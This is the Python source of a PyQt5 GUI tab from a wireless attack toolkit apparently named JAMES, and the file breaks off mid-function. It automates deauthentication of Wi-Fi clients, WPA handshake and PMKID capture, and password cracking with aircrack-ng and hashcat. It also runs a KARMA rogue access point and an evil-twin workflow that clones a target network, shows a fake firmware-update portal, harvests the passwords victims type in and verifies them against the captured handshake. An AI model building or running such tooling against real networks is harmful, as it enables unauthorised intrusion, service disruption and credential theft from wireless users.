"""
JAMES WiFi Arsenal Tab — Unified Recon + Cracker + KARMA.
"""

from pathlib import Path
from PyQt5.QtWidgets import (
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QPushButton,
    QLabel,
    QComboBox,
    QGroupBox,
    QTableWidget,
    QTableWidgetItem,
    QHeaderView,
    QFileDialog,
    QSpinBox,
    QMessageBox,
    QAbstractItemView,
    QSplitter,
    QMenu,
    QLineEdit,
    QPlainTextEdit,
    QProgressBar,
    QFrame,
    QTabWidget,
)
from PyQt5.QtCore import Qt, QTimer, pyqtSignal, QPoint, QThread
from PyQt5.QtGui import QColor, QFont
import os
import json
import time
import logging
from datetime import datetime

from james.gui.toast import show_toast
from james.gui.utils.worker import WorkerThread

logger = logging.getLogger(__name__)


# Re-use AutoKarmaWorker from previous implementation, but modified to fit the new unified tab
class AutoKarmaWorker(QThread):
    log_signal = pyqtSignal(str)
    phase_signal = pyqtSignal(int, str)
    status_signal = pyqtSignal(dict)
    finished_signal = pyqtSignal(bool)

    TOTAL_PHASES = 5

    def __init__(
        self,
        orchestrator,
        probe_duration=30,
        ssid="Free_WiFi",
        portal="wifi_login",
        monitor_duration=300,
    ):
        super().__init__()
        self.orchestrator = orchestrator
        self.pineap = orchestrator.pineap
        self.is_running = True
        self.probe_duration = probe_duration
        self.ssid = ssid
        self.portal = portal
        self.monitor_duration = monitor_duration

    def run(self):
        try:
            self._do_workflow()
        except Exception as e:
            self.log_signal.emit(f"❌ Auto-KARMA crashed: {e}")
            self._safe_cleanup()
            self.finished_signal.emit(False)

    def stop(self):
        self.is_running = False
        self.log_signal.emit("🛑 Stop requested — shutting down KARMA…")

    def _log(self, msg: str):
        self.log_signal.emit(msg)

    def _aborted(self) -> bool:
        if not self.is_running:
            self._log("⏹ Aborted by user.")
            return True
        return False

    def _safe_cleanup(self):
        try:
            self._log("Stopping all PineAP services…")
            self.pineap.stop_all()
        except Exception as e:
            self._log(f"⚠ Cleanup error: {e}")

    def _do_workflow(self):
        # 1. Interface Setup
        self.phase_signal.emit(1, "Phase 1/5: Interface Setup")
        ifaces = self.orchestrator.wifi_interfaces()
        target_iface = None
        for ifc in ifaces:
            name = ifc["interface"]
            if ifc.get("mode", "").lower() == "monitor":
                continue
            safe, reason = self.orchestrator.net_guard.check_monitor_safe(name)
            if safe:
                target_iface = name
                break

        if not target_iface:
            self._log("❌ No safe wireless interface available for KARMA AP.")
            self.finished_signal.emit(False)
            return

        self._log(f"✅ Selected interface: {target_iface}")
        if self._aborted():
            return self.finished_signal.emit(False)

        # 2. Probe Harvest
        self.phase_signal.emit(2, "Phase 2/5: Probe Harvest")
        self._log(f"Harvesting probe requests for {self.probe_duration}s…")
        try:
            mon_iface = self.orchestrator.ensure_monitor_mode(target_iface)
            self.pineap.harvest_probes(mon_iface, duration=self.probe_duration)
            try:
                self.orchestrator.stop_monitor(mon_iface)
            except:
                pass
        except Exception as e:
            self._log(f"⚠ Probe harvest failed: {e}")
            try:
                self.orchestrator.stop_monitor(
                    self.orchestrator._mon_iface(target_iface)
                )
            except:
                pass

        if self._aborted():
            return self.finished_signal.emit(False)

        # 3. KARMA Launch
        self.phase_signal.emit(3, "Phase 3/5: KARMA + Portal Launch")
        self._log(
            f"Launching KARMA AP on {target_iface} with SSID {self.ssid}…"
        )
        try:
            self.pineap.start_karma_with_portal(
                interface=target_iface, ssid=self.ssid, portal=self.portal
            )
            self._log("✅ KARMA Active! Responding to ALL probe requests.")
        except Exception as e:
            self._log(f"❌ KARMA launch failed: {e}")
            self.finished_signal.emit(False)
            return

        if self._aborted():
            self._safe_cleanup()
            return self.finished_signal.emit(False)

        # 4. Monitor Clients
        self.phase_signal.emit(4, "Phase 4/5: Monitoring Clients")
        elapsed = 0
        poll_interval = 5
        while elapsed < self.monitor_duration and self.is_running:
            time.sleep(poll_interval)
            elapsed += poll_interval
            try:
                status = self.pineap.get_live_status()
                self.status_signal.emit(status)
            except Exception as e:
                self._log(f"⚠ Status poll error: {e}")

        # 5. Cleanup
        self.phase_signal.emit(5, "Phase 5/5: Cleanup & Report")
        self._safe_cleanup()
        self._log("✅ Auto-KARMA complete. All services stopped.")
        self.finished_signal.emit(True)


class WiFiArsenalTab(QWidget):
    """Unified WiFi recon + cracking + KARMA tab."""

    def __init__(self, main_window):
        super().__init__()
        self.main_window = main_window
        self.orchestrator = main_window.orchestrator
        self.pineap = self.orchestrator.pineap   # shared with AutoPilotTab
        self.worker = None
        self.karma_worker = None
        self.recon_proc = None
        self.deauth_proc = None

        self.selected_bssid = None
        self.selected_essid = None
        self.selected_channel = None

        self._build_ui()
        self._connect_signals()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)

        self._build_interface_bar(layout)

        # Tab Widget
        self.tabs = QTabWidget()

        self.tabs.addTab(self._build_recon_tab(), "📡 Recon & Targeting")
        self.tabs.addTab(self._build_attack_tab(), "🎯 Attack & Crack")
        self.tabs.addTab(self._build_karma_tab(), "👹 Rogue AP (KARMA)")

        layout.addWidget(self.tabs)

        self.poll_timer = QTimer(self)
        self.poll_timer.timeout.connect(self._do_poll)

        QTimer.singleShot(500, self._refresh_interfaces)

    def _build_interface_bar(self, parent_layout):
        bar = QHBoxLayout()
        bar.addWidget(QLabel("Global Interface:"))
        self.iface_combo = QComboBox()
        self.iface_combo.setMinimumWidth(160)
        bar.addWidget(self.iface_combo)

        self.btn_refresh = QPushButton("↻")
        self.btn_refresh.setFixedWidth(32)
        bar.addWidget(self.btn_refresh)

        self.btn_hw_info = QPushButton("HW Info")
        bar.addWidget(self.btn_hw_info)

        self.btn_monitor_on = QPushButton("▶ MON ON")
        self.btn_monitor_off = QPushButton("■ MON OFF")
        bar.addWidget(self.btn_monitor_on)
        bar.addWidget(self.btn_monitor_off)

        self.lbl_iface_status = QLabel("● Unknown")
        bar.addWidget(self.lbl_iface_status)
        bar.addStretch()

        parent_layout.addLayout(bar)

    def _build_recon_tab(self) -> QWidget:
        tab = QWidget()
        layout = QVBoxLayout(tab)

        # Scan Control Row
        scan_bar = QHBoxLayout()
        self.btn_start_scan = QPushButton("📡 START FULL SCAN")
        self.btn_start_scan.setMinimumHeight(40)
        self.btn_stop_scan = QPushButton("⏹ STOP SCAN")
        self.btn_stop_scan.setMinimumHeight(40)
        self.btn_stop_scan.setEnabled(False)

        scan_bar.addWidget(self.btn_start_scan)
        scan_bar.addWidget(self.btn_stop_scan)

        self.lbl_stats = QLabel("Stats: Ready")
        scan_bar.addStretch()
        scan_bar.addWidget(self.lbl_stats)

        layout.addLayout(scan_bar)

        splitter = QSplitter(Qt.Vertical)

        # APs table
        ap_group = QGroupBox("ACCESS POINTS (Right-click to Clone / Select)")
        ap_layout = QVBoxLayout(ap_group)
        self.ap_table = QTableWidget()
        self.ap_table.setColumnCount(6)
        self.ap_table.setHorizontalHeaderLabels(
            ["BSSID", "ESSID", "CH", "ENC", "PWR", "SIGNAL"]
        )
        self.ap_table.horizontalHeader().setSectionResizeMode(
            1, QHeaderView.Stretch
        )
        self.ap_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.ap_table.setSelectionMode(QAbstractItemView.SingleSelection)
        self.ap_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.ap_table.setContextMenuPolicy(Qt.CustomContextMenu)
        ap_layout.addWidget(self.ap_table)
        splitter.addWidget(ap_group)

        # Clients table
        client_group = QGroupBox(
            "CLIENTS / PROBES (Right-click to Targeted Deauth)"
        )
        client_layout = QVBoxLayout(client_group)
        self.client_table = QTableWidget()
        self.client_table.setColumnCount(4)
        self.client_table.setHorizontalHeaderLabels(
            ["Client MAC", "Connected AP", "Probes", "PWR"]
        )
        self.client_table.horizontalHeader().setSectionResizeMode(
            2, QHeaderView.Stretch
        )
        self.client_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.client_table.setSelectionMode(QAbstractItemView.SingleSelection)
        self.client_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.client_table.setContextMenuPolicy(Qt.CustomContextMenu)
        client_layout.addWidget(self.client_table)
        splitter.addWidget(client_group)

        splitter.setStretchFactor(0, 3)
        splitter.setStretchFactor(1, 2)
        layout.addWidget(splitter)
        return tab

    def _build_attack_tab(self) -> QWidget:
        tab = QWidget()
        layout = QVBoxLayout(tab)

        info_group = QGroupBox("Target Information")
        info_layout = QVBoxLayout(info_group)
        self.lbl_target = QLabel("🎯 Selected Target: None")
        self.lbl_target.setFont(QFont("Arial", 14, QFont.Bold))
        info_layout.addWidget(self.lbl_target)
        layout.addWidget(info_group)

        capture_group = QGroupBox("1. Capture Protocol")
        cap_layout = QHBoxLayout(capture_group)
        self.btn_capture = QPushButton("🎯 CAPTURE HANDSHAKE")
        self.btn_capture.setMinimumHeight(40)
        self.btn_capture.setEnabled(False)
        self.btn_pmkid = QPushButton("🎯 CAPTURE PMKID")
        self.btn_pmkid.setMinimumHeight(40)
        self.btn_pmkid.setEnabled(False)
        cap_layout.addWidget(self.btn_capture)
        cap_layout.addWidget(self.btn_pmkid)
        layout.addWidget(capture_group)

        airgeddon_group = QGroupBox("2. Automated Attack Pipeline")
        airgeddon_layout = QVBoxLayout(airgeddon_group)
        self.btn_airgeddon = QPushButton("👿 LAUNCH AIRGEDDON EVIL TWIN")
        self.btn_airgeddon.setMinimumHeight(50)
        self.btn_airgeddon.setEnabled(False)
        self.btn_airgeddon.setStyleSheet("font-weight: bold; color: #ff4444;")
        self.btn_airgeddon_stop = QPushButton("🛑 STOP AIRGEDDON")
        self.btn_airgeddon_stop.setMinimumHeight(40)
        self.btn_airgeddon_stop.setEnabled(False)
        airgeddon_layout.addWidget(self.btn_airgeddon)
        airgeddon_layout.addWidget(self.btn_airgeddon_stop)
        layout.addWidget(airgeddon_group)

        crack_group = QGroupBox("3. Dictionary Attack Engine (Manual)")
        crack_layout = QVBoxLayout(crack_group)

        file_row = QHBoxLayout()
        file_row.addWidget(QLabel("Capture File:"))
        self.lbl_cap_file = QLabel("None")
        self.btn_browse_cap = QPushButton("📂 Browse...")
        file_row.addWidget(self.lbl_cap_file)
        file_row.addWidget(self.btn_browse_cap)

        file_row.addWidget(QLabel("Wordlist:"))
        self.wl_combo = QComboBox()
        self.wl_combo.setMinimumWidth(200)
        self.btn_browse_wl = QPushButton("📂 Custom...")
        file_row.addWidget(self.wl_combo)
        file_row.addWidget(self.btn_browse_wl)
        crack_layout.addLayout(file_row)

        engine_row = QHBoxLayout()
        self.btn_crack_aircrack = QPushButton("🔓 AIRCRACK-NG")
        self.btn_crack_aircrack.setMinimumHeight(40)
        self.btn_crack_hashcat = QPushButton("🔥 HASHCAT")
        self.btn_crack_hashcat.setMinimumHeight(40)
        self.btn_crack_smart = QPushButton("🧠 SMART (Auto)")
        self.btn_crack_smart.setMinimumHeight(40)
        engine_row.addWidget(self.btn_crack_aircrack)
        engine_row.addWidget(self.btn_crack_hashcat)
        engine_row.addWidget(self.btn_crack_smart)
        crack_layout.addLayout(engine_row)
        layout.addWidget(crack_group)

        result_group = QGroupBox("Results")
        result_layout = QVBoxLayout(result_group)
        self.lbl_result = QLabel("● Ready")
        self.lbl_result.setFont(QFont("Arial", 12))
        result_layout.addWidget(self.lbl_result)
        layout.addWidget(result_group)

        layout.addStretch()
        return tab

    def _build_karma_tab(self) -> QWidget:
        tab = QWidget()
        layout = QVBoxLayout(tab)

        config_group = QGroupBox("Campaign Configuration")
        config_layout = QVBoxLayout(config_group)

        set_row = QHBoxLayout()
        set_row.addWidget(QLabel("Evil Twin SSID:"))
        self.txt_ssid = QLineEdit("Free_WiFi")
        set_row.addWidget(self.txt_ssid)
        set_row.addWidget(QLabel("Captive Portal:"))
        self.combo_portal = QComboBox()
        self.combo_portal.addItems(
            ["wifi_login", "hotel_login", "social_login"]
        )
        set_row.addWidget(self.combo_portal)
        config_layout.addLayout(set_row)

        ctrl_row = QHBoxLayout()
        self.btn_karma_start = QPushButton("👹 START KARMA CAMPAIGN")
        self.btn_karma_start.setMinimumHeight(40)
        self.btn_karma_stop = QPushButton("🛑 STOP CAMPAIGN")
        self.btn_karma_stop.setMinimumHeight(40)
        self.btn_karma_stop.setEnabled(False)
        ctrl_row.addWidget(self.btn_karma_start)
        ctrl_row.addWidget(self.btn_karma_stop)
        config_layout.addLayout(ctrl_row)
        layout.addWidget(config_group)

        dashboard_group = QGroupBox("Live Dashboard")
        dash_layout = QVBoxLayout(dashboard_group)
        stats_row = QHBoxLayout()
        self.lbl_karma_clients = QLabel("💻 Clients Connected: 0")
        self.lbl_karma_dns = QLabel("🌐 DNS Queries: 0")
        self.lbl_karma_creds = QLabel("🔑 Harvested Credentials: 0")
        self.lbl_karma_clients.setFont(QFont("Arial", 11, QFont.Bold))
        self.lbl_karma_dns.setFont(QFont("Arial", 11, QFont.Bold))
        self.lbl_karma_creds.setFont(QFont("Arial", 11, QFont.Bold))
        stats_row.addWidget(self.lbl_karma_clients)
        stats_row.addWidget(self.lbl_karma_dns)
        stats_row.addWidget(self.lbl_karma_creds)
        dash_layout.addLayout(stats_row)

        tabs = QSplitter(Qt.Horizontal)
        self.karma_clients_tbl = QTableWidget(0, 2)
        self.karma_clients_tbl.setHorizontalHeaderLabels(
            ["Client IP", "Client MAC"]
        )
        self.karma_clients_tbl.horizontalHeader().setSectionResizeMode(
            QHeaderView.Stretch
        )
        self.karma_creds_tbl = QTableWidget(0, 2)
        self.karma_creds_tbl.setHorizontalHeaderLabels(
            ["Target IP", "Credentials Payload"]
        )
        self.karma_creds_tbl.horizontalHeader().setSectionResizeMode(
            QHeaderView.Stretch
        )
        tabs.addWidget(self.karma_clients_tbl)
        tabs.addWidget(self.karma_creds_tbl)
        dash_layout.addWidget(tabs)
        layout.addWidget(dashboard_group)

        log_group = QGroupBox("Event Log")
        log_layout = QVBoxLayout(log_group)
        self.karma_log = QPlainTextEdit()
        self.karma_log.setReadOnly(True)
        self.karma_log.setMinimumHeight(120)
        log_layout.addWidget(self.karma_log)
        layout.addWidget(log_group)

        return tab

    def _connect_signals(self):
        self.btn_refresh.clicked.connect(self._refresh_interfaces)
        self.btn_hw_info.clicked.connect(self._show_hw_info)
        self.btn_monitor_on.clicked.connect(self._enable_monitor)
        self.btn_monitor_off.clicked.connect(self._disable_monitor)
        self.iface_combo.currentTextChanged.connect(self._update_iface_status)

        self.btn_start_scan.clicked.connect(self._start_scan)
        self.btn_stop_scan.clicked.connect(self._stop_scan)

        self.ap_table.itemSelectionChanged.connect(self._on_ap_selected)
        self.ap_table.customContextMenuRequested.connect(self._show_ap_menu)
        self.client_table.customContextMenuRequested.connect(
            self._show_client_menu
        )

        self.btn_capture.clicked.connect(self._capture_handshake)
        self.btn_pmkid.clicked.connect(self._capture_pmkid)
        self.btn_airgeddon.clicked.connect(self._airgeddon_evil_twin)
        self.btn_airgeddon_stop.clicked.connect(self._stop_airgeddon)

        self.btn_browse_cap.clicked.connect(self._browse_capture)
        self.btn_browse_wl.clicked.connect(self._browse_wordlist)

        self.btn_crack_aircrack.clicked.connect(
            lambda: self._crack("aircrack")
        )
        self.btn_crack_hashcat.clicked.connect(lambda: self._crack("hashcat"))
        self.btn_crack_smart.clicked.connect(lambda: self._crack("smart"))

        self.btn_karma_start.clicked.connect(self._start_karma)
        self.btn_karma_stop.clicked.connect(self._stop_karma)

    # ── Context Menus ──────────────────────────────────────────────

    def _show_ap_menu(self, pos: QPoint):
        idx = self.ap_table.indexAt(pos)
        if not idx.isValid():
            return

        row = idx.row()
        bssid = self.ap_table.item(row, 0).text()
        essid = self.ap_table.item(row, 1).text()

        menu = QMenu(self)
        clone_action = menu.addAction(f"👹 Clone AP '{essid}' (Evil Twin)")
        clone_action.triggered.connect(lambda: self._clone_ap(essid))

        menu.exec_(self.ap_table.viewport().mapToGlobal(pos))

    def _show_client_menu(self, pos: QPoint):
        idx = self.client_table.indexAt(pos)
        if not idx.isValid():
            return

        row = idx.row()
        mac = self.client_table.item(row, 0).text()
        bssid = self.client_table.item(row, 1).text()

        menu = QMenu(self)
        deauth_single = menu.addAction(f"🔫 Send Deauth Burst to {mac}")
        deauth_single.triggered.connect(
            lambda: self._targeted_deauth(mac, bssid, False)
        )

        deauth_cont = menu.addAction(f"🔥 Continuous Deauth (Loop) {mac}")
        deauth_cont.triggered.connect(
            lambda: self._targeted_deauth(mac, bssid, True)
        )

        if self.deauth_proc:
            stop_deauth = menu.addAction("⏹ Stop Continuous Deauth")
            stop_deauth.triggered.connect(self._stop_deauth)

        menu.exec_(self.client_table.viewport().mapToGlobal(pos))

    # ── Feature Implementations ────────────────────────────────────

    def _refresh_interfaces(self):
        self.iface_combo.clear()
        try:
            self.last_audit = self.orchestrator.audit_wifi_hardware()
            for i, ifc in enumerate(self.orchestrator.wifi_interfaces()):
                name = ifc["interface"]
                mode = ifc.get("mode", "?")
                audit = self.last_audit.get(name, {})
                score = audit.get("score", "orange")

                if score == "green":
                    label = f"{name} ({mode}) ✅"
                    color = QColor(0, 150, 0)
                elif score == "red":
                    label = f"{name} ({mode}) ❌"
                    color = QColor(200, 0, 0)
                else:
                    label = f"{name} ({mode}) ⚠"
                    color = QColor(200, 100, 0)

                self.iface_combo.addItem(label, name)
                self.iface_combo.setItemData(i, color, Qt.ForegroundRole)
        except Exception as e:
            logger.warning(f"Interfaces error: {e}")
        self._update_iface_status()

    def _show_hw_info(self):
        if not hasattr(self, "last_audit") or not self.last_audit:
            return show_toast(self.main_window, "No hardware data", "error")

        msg = "<b>WiFi Hardware Compatibility Audit</b><br><br>"
        for iface, data in self.last_audit.items():
            icon = (
                "✅"
                if data["score"] == "green"
                else "❌" if data["score"] == "red" else "⚠"
            )
            msg += f"<b>{icon} {iface}</b><br>"
            msg += f"Chipset: {data['chipset']}<br>"
            msg += f"Driver: {data['driver']}<br>"
            msg += f"Monitor Support: {'Yes' if data['monitor_supported'] else 'No'}<br>"
            msg += f"<i>{data['reason']}</i><br><br>"

        QMessageBox.information(self, "Hardware Info", msg)

    def _update_iface_status(self):
        txt = self.iface_combo.currentText()
        if "Monitor" in txt:
            self.lbl_iface_status.setText("● Monitor")
        elif "Managed" in txt:
            self.lbl_iface_status.setText("● Managed")
        else:
            self.lbl_iface_status.setText("● Unknown")

    def _enable_monitor(self):
        iface = self.iface_combo.currentData()
        if iface:
            self.worker = WorkerThread(self.orchestrator.start_monitor, iface)
            self.worker.finished.connect(lambda r: self._refresh_interfaces())
            self.worker.start()

    def _disable_monitor(self):
        iface = self.iface_combo.currentData()
        if iface:
            self.worker = WorkerThread(self.orchestrator.stop_monitor, iface)
            self.worker.finished.connect(lambda r: self._refresh_interfaces())
            self.worker.start()

    def _start_scan(self):
        iface = self.iface_combo.currentData()
        if not iface:
            return show_toast(
                self.main_window, "No interface selected", "error"
            )

        try:
            mon_iface = self.orchestrator.ensure_monitor_mode(iface)
        except Exception as e:
            return show_toast(
                self.main_window, f"Monitor mode error: {e}", "error"
            )

        self.orchestrator.layer.run("rm -f /tmp/james_recon*")
        self.recon_proc = self.orchestrator.aircrack.start_airodump(
            mon_iface, write_prefix="/tmp/james_recon"
        )
        self.poll_timer.start(3000)
        self.btn_start_scan.setEnabled(False)
        self.btn_stop_scan.setEnabled(True)

    def _stop_scan(self):
        self.poll_timer.stop()
        if self.recon_proc:
            try:
                self.orchestrator.layer.kill_background(self.recon_proc)
            except:
                pass
            self.recon_proc = None
        self.btn_start_scan.setEnabled(True)
        self.btn_stop_scan.setEnabled(False)

    def _do_poll(self):
        csv_file = "/tmp/james_recon-01.csv"
        if not os.path.exists(csv_file):
            return
        try:
            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                data = self.orchestrator.aircrack.parse_airodump_csv(f.read())
        except:
            return

        aps = [
            a
            for a in data.get("aps", [])
            if a.get("bssid", "").count(":") == 5
        ]
        aps.sort(key=lambda x: x.get("power", -100), reverse=True)
        self.lbl_stats.setText(
            f"📡 {len(aps)} APs  |  👤 {len(data.get('stations', []))} Clients"
        )

        self.ap_table.setRowCount(len(aps))
        for i, ap in enumerate(aps):
            self.ap_table.setItem(i, 0, QTableWidgetItem(ap.get("bssid", "")))
            self.ap_table.setItem(i, 1, QTableWidgetItem(ap.get("essid", "")))
            self.ap_table.setItem(
                i, 2, QTableWidgetItem(str(ap.get("channel", "")))
            )
            self.ap_table.setItem(
                i, 3, QTableWidgetItem(ap.get("privacy", ""))
            )
            self.ap_table.setItem(
                i, 4, QTableWidgetItem(str(ap.get("power", "")))
            )
            self.ap_table.setItem(
                i,
                5,
                QTableWidgetItem(
                    "█" * max(1, min(5, (100 + ap.get("power", -100)) // 10))
                ),
            )

        clients = data.get("stations", [])
        self.client_table.setRowCount(len(clients))
        for i, c in enumerate(clients):
            self.client_table.setItem(
                i, 0, QTableWidgetItem(c.get("station_mac", c.get("mac", "")))
            )
            self.client_table.setItem(
                i, 1, QTableWidgetItem(c.get("bssid", ""))
            )
            self.client_table.setItem(
                i, 2, QTableWidgetItem(c.get("probes", ""))
            )
            self.client_table.setItem(
                i, 3, QTableWidgetItem(str(c.get("power", "")))
            )

    def _on_ap_selected(self):
        rows = self.ap_table.selectedItems()
        if not rows:
            return
        r = rows[0].row()
        self.selected_bssid = self.ap_table.item(r, 0).text()
        self.selected_essid = self.ap_table.item(r, 1).text()
        self.selected_channel = self.ap_table.item(r, 2).text()
        self.lbl_target.setText(
            f"🎯 {self.selected_bssid} · {self.selected_essid}"
        )
        self.btn_capture.setEnabled(True)
        self.btn_pmkid.setEnabled(True)
        self.btn_airgeddon.setEnabled(True)

    # Targeted Deauth
    def _targeted_deauth(self, client_mac: str, bssid: str, continuous: bool):
        iface = self.iface_combo.currentData()
        if not iface:
            return show_toast(self.main_window, "No interface", "error")
        if not bssid or bssid == "(not associated)":
            return show_toast(
                self.main_window, "Client not associated to AP", "error"
            )

        self.main_window._set_idle(False)
        try:
            mon_iface = self.orchestrator.ensure_monitor_mode(iface)
        except Exception as e:
            return show_toast(self.main_window, f"Mon mode fail: {e}", "error")

        if continuous:
            show_toast(
                self.main_window, f"Continuous deauth started for {client_mac}"
            )
            cmd = f"aireplay-ng -0 0 -a {bssid} -c {client_mac} {mon_iface}"
            self.deauth_proc = self.orchestrator.layer.run_background(
                cmd, sudo=True
            )
        else:
            show_toast(
                self.main_window, f"Sending deauth burst to {client_mac}"
            )

            def do_deauth():
                self.orchestrator.aircrack.deauth(
                    mon_iface, bssid, count=10, client=client_mac
                )

            self.worker = WorkerThread(do_deauth)
            self.worker.finished.connect(
                lambda _: self.main_window._set_idle(True)
            )
            self.worker.start()

    def _stop_deauth(self):
        if self.deauth_proc:
            self.orchestrator.layer.kill_background(self.deauth_proc)
            self.deauth_proc = None
            show_toast(self.main_window, "Continuous deauth stopped")

    # AP Cloning
    def _clone_ap(self, essid: str):
        self.txt_ssid.setText(essid)
        show_toast(self.main_window, f"AP '{essid}' loaded for Evil Twin")

    # Airgeddon Automated Flow
    def _airgeddon_evil_twin(self):
        iface = self.iface_combo.currentData()
        bssid, ch, essid = (
            self.selected_bssid,
            self.selected_channel,
            self.selected_essid,
        )
        if not iface or not bssid:
            return
        self._stop_scan()

        self.btn_airgeddon.setEnabled(False)
        self.btn_airgeddon_stop.setEnabled(True)
        self.lbl_result.setText("● Starting Airgeddon Evil Twin workflow…")

        # We need a dedicated worker reference so we can stop it
        self._airgeddon_active = True

        def _do_airgeddon():
            # Step 1: Handshake
            self.main_window._append_log(
                "[AIRGEDDON] Step 1: Capturing handshake..."
            )
            mon = self.orchestrator.ensure_monitor_mode(iface)
            prefix = f"/tmp/james_cap_{bssid.replace(':','')}"
            self.orchestrator.layer.run(f"rm -f {prefix}*")
            proc = self.orchestrator.aircrack.start_airodump(
                mon, channel=int(ch), bssid=bssid, write_prefix=prefix
            )

            client = None
            clients = [
                self.client_table.item(i, 0).text()
                for i in range(self.client_table.rowCount())
                if self.client_table.item(i, 1).text() == bssid
            ]
            if clients:
                client = clients[0]

            cap_file = f"{prefix}-01.cap"
            found = False
            for _ in range(5):
                if not self._airgeddon_active:
                    break
                self.orchestrator.aircrack.deauth(
                    mon, bssid, count=10, client=client
                )
                time.sleep(10)
                if Path(
                    cap_file
                ).exists() and self.orchestrator.aircrack.check_handshake(
                    cap_file, bssid
                ):
                    found = True
                    break

            self.orchestrator.layer.kill_background(proc)

            if not found:
                self.main_window._append_log(
                    "[AIRGEDDON] Handshake capture failed. Aborting."
                )
                return {"success": False, "msg": "Handshake capture failed"}

            self.main_window._append_log(
                "[AIRGEDDON] Handshake captured successfully!"
            )

            # Switch interface back to managed for hostapd (mana needs managed)
            self.main_window._append_log(
                "[AIRGEDDON] Step 2: Spinning up Evil Twin & Captive Portal..."
            )
            self.orchestrator.layer.run(f"airmon-ng stop {mon}", sudo=True)
            managed_iface = iface  # Using the base managed interface name

            # Clear creds
            from james.tools.pineap import CREDS_LOG

            if CREDS_LOG.exists():
                CREDS_LOG.unlink()

            self.pineap.stop_all()
            self.pineap.start_karma_with_portal(
                interface=managed_iface,
                channel=int(ch),
                ssid=essid,
                portal="firmware_update",
                bssid=bssid,
            )

            # Step 3: Deauth Target Continuous
            self.main_window._append_log(
                "[AIRGEDDON] Step 3: Continuously deauthing original target..."
            )
            # We need a secondary adapter for continuous deauth ideally, but if we only have one, hostapd holds it.
            # Airgeddon typically requires 2 adapters for the Evil Twin attack (one for AP, one for Deauth).
            # If the user has a second adapter in monitor mode, let's try to use it.
            # For now, we'll try to find any monitor mode adapter for deauth.
            deauth_mon = None
            for other_iface in [
                self.iface_combo.itemData(i)
                for i in range(self.iface_combo.count())
            ]:
                if other_iface != managed_iface and "mon" in other_iface:
                    deauth_mon = other_iface
                    break

            deauth_proc = None
            if deauth_mon:
                self.main_window._append_log(
                    f"[AIRGEDDON] Using {deauth_mon} for continuous deauth."
                )
                deauth_proc = self.orchestrator.layer.run_background(
                    f"aireplay-ng -0 0 -a {bssid} {deauth_mon}", sudo=True
                )
            else:
                self.main_window._append_log(
                    "[AIRGEDDON] WARNING: No secondary monitor interface found for continuous deauth! Target clients may not disconnect."
                )

            # Step 4: Verification Loop
            self.main_window._append_log(
                "[AIRGEDDON] Step 4: Waiting for credentials and verifying..."
            )
            valid_password = None
            verified_creds = set()

            while self._airgeddon_active:
                time.sleep(3)
                creds = self.pineap.get_creds()
                for cred in creds:
                    pwd = cred.get("password")
                    if pwd and pwd not in verified_creds:
                        verified_creds.add(pwd)
                        self.main_window._append_log(
                            f"[AIRGEDDON] Testing submitted password: {pwd}"
                        )

                        # Write to temp dict
                        dict_path = "/tmp/james_airgeddon.txt"
                        Path(dict_path).write_text(pwd + "\\n")

                        # Verify with aircrack
                        res = self.orchestrator.aircrack.crack(
                            cap_file, dict_path, bssid
                        )
                        if res.get("success"):
                            valid_password = pwd
                            break

                if valid_password:
                    break

            # Cleanup
            self.pineap.stop_all()
            if deauth_proc:
                self.orchestrator.layer.kill_background(deauth_proc)

            if valid_password:
                return {"success": True, "password": valid_password}
            else:
                return {"success": False, "msg": "Attack aborted"}

        self.worker = WorkerThread(_do_airgeddon)
        self.worker.finished.connect(self._on_airgeddon_done)
        self.worker.start()

    def _stop_airgeddon(self):
        self._airgeddon_active = False
        self.btn_airgeddon_stop.setEnabled(False)
        self.lbl_result.setText("● Stopping Airgeddon...")

    def _on_airgeddon_done(self, res):
        self.btn_airgeddon.setEnabled(True)
        self.btn_airgeddon_stop.setEnabled(False)

        if isinstance(res, Exception):
            self.lbl_result.setText(f"● Airgeddon error: {res}")
        elif res.get("success"):
            pwd = res.get("password")
            self.lbl_result.setStyleSheet(
                "color: #00ff00; font-size: 24px; font-weight: bold;"
            )
            self.lbl_result.setText(f"PASSWORD FOUND: {pwd}")
            show_toast(
                self.main_window, f"Airgeddon Success: {pwd}", "success"
            )
            self.main_window._append_log(
                f"\\n\\n{'='*40}\\n[AIRGEDDON] PWNED! Password: {pwd}\\n{'='*40}\\n"
            )
        else:
            self.lbl_result.setText(f"● {res.get('msg', 'Airgeddon aborted')}")

    # Capture & Crack
    def _capture_handshake(self):
        iface = self.iface_combo.currentData()
        bssid, ch = self.selected_bssid, self.selected_channel
        if not iface or not bssid:
            return
        self._stop_scan()
        self.lbl_result.setText("● Capturing handshake…")

        def _do_cap():
            mon = self.orchestrator.ensure_monitor_mode(iface)
            prefix = f"/tmp/james_cap_{bssid.replace(':','')}"
            self.orchestrator.layer.run(f"rm -f {prefix}*")
            proc = self.orchestrator.aircrack.start_airodump(
                mon, channel=int(ch), bssid=bssid, write_prefix=prefix
            )

            # Find strongest client for targeted deauth instead of broadcast
            client = None
            clients = [
                self.client_table.item(i, 0).text()
                for i in range(self.client_table.rowCount())
                if self.client_table.item(i, 1).text() == bssid
            ]
            if clients:
                client = clients[0]  # taking the first (strongest) one

            cap_file = f"{prefix}-01.cap"
            found = False
            for _ in range(5):
                self.orchestrator.aircrack.deauth(
                    mon, bssid, count=10, client=client
                )
                time.sleep(10)
                if Path(
                    cap_file
                ).exists() and self.orchestrator.aircrack.check_handshake(
                    cap_file, bssid
                ):
                    found = True
                    break

            self.orchestrator.layer.kill_background(proc)
            return {"success": found, "file": cap_file}

        self.worker = WorkerThread(_do_cap)
        self.worker.finished.connect(self._on_capture_done)
        self.worker.start()

    def _capture_pmkid(self):
        iface = self.iface_combo.currentData()
        if not iface:
            return
        self._stop_scan()
        self.lbl_result.setText("● Capturing PMKID…")

        def _do_pmkid():
            mon = self.orchestrator.ensure_monitor_mode(iface)
            out = "/tmp/james_pmkid.pcapng"
            hash_out = "/tmp/james_pmkid.hc22000"
            self.orchestrator.layer.run(f"rm -f {out} {hash_out}")

            self.orchestrator.hcxtools.capture_pmkid(mon, out, timeout=30)
            if not Path(out).exists():
